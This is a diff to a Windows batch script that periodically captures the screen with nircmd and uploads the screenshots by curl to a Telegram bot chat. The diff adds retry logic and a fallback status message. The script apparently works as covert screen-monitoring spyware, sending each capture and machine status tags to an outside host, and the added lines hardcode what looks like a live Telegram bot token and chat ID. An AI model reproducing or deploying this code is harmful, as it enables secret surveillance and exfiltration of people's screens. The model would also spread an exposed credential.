@@ -9,7 +9,7 @@ if not exist "%temp%\i059.tmp" type nul > "%temp%\i059.tmp"
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=5.3"
+set "BATCHVERSION=5.4"
 
 
 
@@ -247,7 +247,7 @@ set "TOPIC_ID_MyScrn=74293"
 set "MESSAGE_MyScrn=Left......|%time%|"
 set "ENCODED_MESSAGE_MyScrn=%MESSAGE_MyScrn: =%%2"
 set "CAPTION_MyScrn="
-set "FILE_PATH_MyScrn=%USERPROFILE%\Downloads\screenshot.png"
+set "FILE_PATH_MyScrn=%USERPROFILE%\Downloads\LastScreenshots\screenshot%TIMESS%.png"
 
 
 
@@ -277,14 +277,54 @@ del /f /q "%USERPROFILE%\Downloads\LastScreenshots\screenshot%TIMESS%.png"
 "%nircmd%" savescreenshot "%USERPROFILE%\Downloads\LastScreenshots\screenshot%TIMESS%.png"
 
 
+
+
+set RETRIES=1
 :: Send Photo
+echo.
+echo TrySendTimes=%RETRIES%
+echo.
 curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendPhoto" ^
      -F "chat_id=%CHAT_ID_MyScrn%" ^
      -F "message_thread_id=%TOPIC_ID_MyScrn%" ^
      -F "caption=KadyyGmr|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%time%|%BATCHVERSION%|" ^
-     -F "photo=@%USERPROFILE%\Downloads\LastScreenshots\screenshot%TIMESS%.png" ^
+     -F "photo=@%FILE_PATH_MyScrn%" ^
      --limit-rate 80K
 
+
+if %ERRORLEVEL% NEQ 0 (
+    echo Photo Not sended.
+    echo Add +1 To Retries
+    set /a RETRIES+=1
+	echo Retries = !RETRIES!
+	echo.
+    if !RETRIES! LSS 4 (
+	    echo Retries doesnt exceed 3
+        timeout /t 1 /nobreak
+        goto SendPhoto
+    ) else (
+	echo Retries = !RETRIES! .. Sending Bad Internet..
+	echo.
+	echo.
+    curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -F "chat_id=-1002163721260" -F "message_thread_id=74293" -F "text=KadyyGmr|BadINTRNT|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%time%|%BATCHVERSION%|"
+	curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -F "chat_id=-1002163721260" -F "message_thread_id=74293" -F "text=KadyyGmr|BadINTRNT|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%time%|%BATCHVERSION%|"
+	echo.
+	echo Maybe Bad Internet Sent..
+	echo.
+	echo.
+    )
+) else (
+    echo.
+	echo.
+    echo Photo Sent Perfect
+)
+
+
+
+
+
+
+set RETRIES=1
 :: Send File
 curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendDocument" ^
      -F "chat_id=%CHAT_ID_MyScrn%" ^
